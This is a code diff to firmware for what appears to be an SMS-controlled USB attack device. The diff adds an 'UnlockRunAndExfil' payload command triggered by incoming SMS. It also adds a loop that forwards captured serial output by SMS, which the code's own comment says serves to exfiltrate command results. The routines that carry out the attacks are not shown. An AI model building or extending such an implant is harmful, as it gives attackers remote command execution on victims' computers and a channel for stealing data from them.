@@ -12,7 +12,11 @@
 #include "globals.h"
 
 //USBhost = C_USBhost(Serial1, /*debug_state*/false);
-C_USBhost USBhost = C_USBhost(Serial1, DEBUG);
+#ifdef DEBUG
+C_USBhost USBhost = C_USBhost(Serial1, 1);
+#else
+C_USBhost USBhost = C_USBhost(Serial1, 0);
+#endif
 SoftwareSerial SMSSERIAL(8, 9);
 
 unsigned long previousMillis = 0;
@@ -176,8 +180,11 @@ void loop(){
       }
 #endif
       
-      if (payload == "unlock_download"){
+      if (payload == "UnlockDownload"){
         unlockDownload(SMS_text);
+      }
+      else if(payload == "UnlockRunAndExfil"){
+        unlockRunAndExfil(SMS_text);
       }
       else if(payload == "Manual"){
         manualPayload(SMS_text);
@@ -188,15 +195,22 @@ void loop(){
   #endif
         sendSMSMessage("Unknown payload '" + payload + "'\nFull message: " + SMS_text);
       }
-      // After execute a fake payload it does a long sleep
-  #ifdef DEBUGWITHOUTSIM
-      delay(120000);
-  #endif
+      // After execute a fake payload it does a sleep
+#ifdef DEBUGWITHOUTSIM
+      delay(30000);
+#endif
     }
     else {
 #ifdef DEBUG
       Serial.println("Receive something that is not an SMS: " + SMS);
 #endif
     }
+  }
+
+  // If there is anything to read from the serial port we forward it via SMSs 
+  // This is used to exfil the result of commands
+  if (Serial.available()) {
+    String output = Serial.readString();
+    sendSMSMessage("Ex: " + output);
   }
 }
